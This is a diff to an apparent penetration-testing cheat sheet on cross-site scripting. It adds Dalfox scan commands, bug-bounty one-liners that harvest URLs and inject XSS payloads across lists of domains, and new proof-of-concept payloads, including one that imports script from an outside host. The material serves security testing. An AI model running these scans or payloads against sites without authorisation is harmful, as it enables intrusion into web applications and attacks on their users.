@@ -23,6 +23,18 @@ python xsstrike.py -u https://target.url/
 ```
 {% endtab %}
 
+{% tab title="Dalfox" %}
+[Dalfox](https://github.com/hahwul/dalfox) is a powerful open-source XSS scanner and utility focused on automation.
+
+```bash
+# Scan an URL
+dalfox url http://testphp.vulnweb.com/listproducts.php?cat=1
+
+# From an URLs file
+cat urls.txt | dalfox pipe
+```
+{% endtab %}
+
 {% tab title="XSSer" %}
 [XSSer](https://github.com/epsylon/xsser) (Python) is a tool that can detect, exploit and report XSS vulnerabilities on a web application
 
@@ -54,6 +66,25 @@ On the target side, XSS payload should looks like:
 <script url="https://your.domain.com/handler.js"></script>
 ```
 {% endtab %}
+
+{% tab title="One-Liners" %}
+Here are some handy one-liners to automate XSS scans on domains using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gxss](https://github.com/KathanP19/Gxss), [Dalfox](https://github.com/hahwul/dalfox).
+
+{% hint style="success" %}
+It may be usefull for bug bounty hunting
+{% endhint %}
+
+```bash
+# HTTPX
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
+
+# Dalfox
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+
+# Curl, single domain
+echo test.target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+```
+{% endtab %}
 {% endtabs %}
 
 ### Enumeration - Find XSS Vulnerabilities
@@ -79,10 +110,19 @@ The following [website](https://transformations.jobertabma.nl/) (or [Github](htt
 Generally we will use following payloads as a proof of concept. It will open an alert window.
 
 ```html
+// Classic Payloads
 <script>alert('XSS');</script>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG onmouseover="alert('XSS')">
 <<SCRIPT>alert("XSS");//<</SCRIPT>
+
+// Useful payloads
+<K OnPointerRawUpdate=alert(1)>
+<K OnPointerMove=alert(1)>
+\’/alert(1)//
+<K ContentEditable AutoFocus OnFocus=alert(1)>
+<Svg OnLoad=alert(1)>
+<Img Src=//X55.is OnLoad=import(src)>
 ```
 {% endtab %}
 
